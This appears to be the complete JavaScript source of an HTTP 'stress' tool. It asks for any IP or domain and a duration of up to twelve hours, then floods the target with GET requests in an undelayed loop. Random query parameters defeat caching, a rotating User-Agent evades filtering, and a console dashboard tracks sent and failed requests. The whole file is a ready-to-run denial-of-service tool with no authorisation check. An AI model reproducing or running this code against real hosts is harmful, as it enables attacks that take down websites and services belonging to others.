const axios = require("axios")
    , dayjs = require("dayjs")
    , dayjs_duration = require("dayjs/plugin/duration");
dayjs.extend(dayjs_duration);
const randomua = require("random-useragent")
    , kindof = require("kind-of")
    , readline = require("readline")
    , rl = readline.createInterface({ input: process.stdin, output: process.stdout })
    , Package = require("./package.json");
let intervals = {};
const print = () => { console.clear(), console.log("\n"), console.log("    \x1b[90m #####   ######   #####    #####    #####    #####", "\x1b[0m"), console.log("    \x1b[90m##         ##     ##  ##   ##      ##       ##", "\x1b[0m"), console.log("    \x1b[90m ####      ##     #####    ####     ####     ####", "\x1b[0m"), console.log("    \x1b[90m    ##     ##     ##  ##   ##          ##       ##", "\x1b[0m"), console.log("    \x1b[90m#####      ##     ##  ##   #####   #####    #####", "\x1b[0m"), console.log(""), console.log("                                                   \x1b[37mv" + Package.version, "\x1b[0m"), console.log("") }
    , start = () => {
        print(), rl.question("Target (IP/Domain): ", t => {
            if (print(), "string" !== kindof(t = t.toLowerCase()
                    .trim()
                    .split("https://")
                    .join("")
                    .split("http://")
                    .join("")
                    .split("/")[0])) { console.log("Field target must be a string."), setTimeout(start, 2500); return }
            if ("" === t) { console.log("Field target cannot be left blank."), setTimeout(start, 2500); return } console.log("Target (IP/Domain): " + t), rl.question("PPT (Packets Per Transaction): ", a => {
                if (print(), isNaN(a)) { console.log("Field ppt must be a number."), setTimeout(start, 2500); return }
                if ("" === a) { console.log("Field ppt cannot be left blank."), setTimeout(start, 2500); return } a < 1 && (a = 1), a > 100 && (a = 100), console.log("Target (IP/Domain): " + t), console.log("PPT (Packets Per Transaction): " + a), rl.question("Duration (s): ", async e => {
                    if (print(), isNaN(e)) { console.log("Field duration must be a number."), setTimeout(start, 2500); return }
                    if ("" === e) { console.log("Field duration cannot be left blank."), setTimeout(start, 2500); return } e < 1 && (e = 1), e > 43200 && (e = 43200), console.log("Target (IP/Domain): " + t), console.log("PPT (Packets Per Transaction): " + a), console.log("Duration (s): " + e), console.log(""), console.log("Status                       \x1b[33mPreparing... ⟳", "\x1b[0m"), console.log("Packets Sent                 \x1b[90m--", "\x1b[0m"), console.log("Successful Resp.             \x1b[90m--", "\x1b[0m"), console.log("Unsuccessful Resp.           \x1b[90m--", "\x1b[0m"), console.log("Remaining Time               \x1b[90m--", "\x1b[0m"), console.log(""), await Bun.sleep(1e3), print(), console.log("Target (IP/Domain): " + t), console.log("PPT (Packets Per Transaction): " + a), console.log("Duration (s): " + e), console.log(""), console.log("Status                       \x1b[33mAlmost Ready... ⟳", "\x1b[0m"), console.log("Packets Sent                 \x1b[90m--", "\x1b[0m"), console.log("Successful Resp.             \x1b[90m--", "\x1b[0m"), console.log("Unsuccessful Resp.           \x1b[90m--", "\x1b[0m"), console.log("Remaining Time               \x1b[90m--", "\x1b[0m"), console.log(""), await Bun.sleep(2500);
                    let o = !0
                        , n = 0
                        , s = 0
                        , l = 0
                        , r = e;
                    intervals.STRESSING = setInterval(() => {
                        for (let e = 0; e < a; e++) n++, axios.get("http://" + t, {
                                params: {
                                    [Math.random()]: Math.random()
                                }
                                , headers: { "User-Agent": randomua.getRandom() }
                                , validateStatus: t => t >= 200 && t < 300 || t >= 400 && t < 500
                            })
                            .then(t => s++)
                            .catch(t => l++)
                    });
                    let $, i, m, g;
                    setInterval(() => {
                        print(), console.log("Target (IP/Domain): " + t), console.log("PPT (Packets Per Transaction): " + a), console.log("Duration (s): " + e), console.log(""), console.log("Status                       " + (o ? "\x1b[37mRunning ▶" : "\x1b[31mStopped ■"), "\x1b[0m"), console.log("Packets Sent                 " + ($ !== n ? "\x1b[34m" : "\x1b[90m") + (void 0 !== n ? n + " ↑" : "--"), "\x1b[0m"), console.log("Successful Resp.             " + (i !== s ? "\x1b[32m" : "\x1b[90m") + (void 0 !== s ? s + " ↓" : "--"), "\x1b[0m"), console.log("Unsuccessful Resp.           " + (m !== l ? "\x1b[31m" : "\x1b[90m") + (void 0 !== l ? l + " ⇣" : "--"), "\x1b[0m"), console.log("Remaining Time               " + (g !== r ? "\x1b[33m" : "\x1b[90m") + (void 0 !== r ? dayjs.duration(r, "seconds")
                            .format("HH:mm:ss") + " ⏱︎" : "--"), "\x1b[0m"), console.log(""), $ = n, i = s, m = l, g = r
                    }, 1e3), setInterval(() => { 0 === r ? (o = !1, clearInterval(intervals.STRESSING)) : r-- }, 1e3)
                })
            })
        })
    };
start();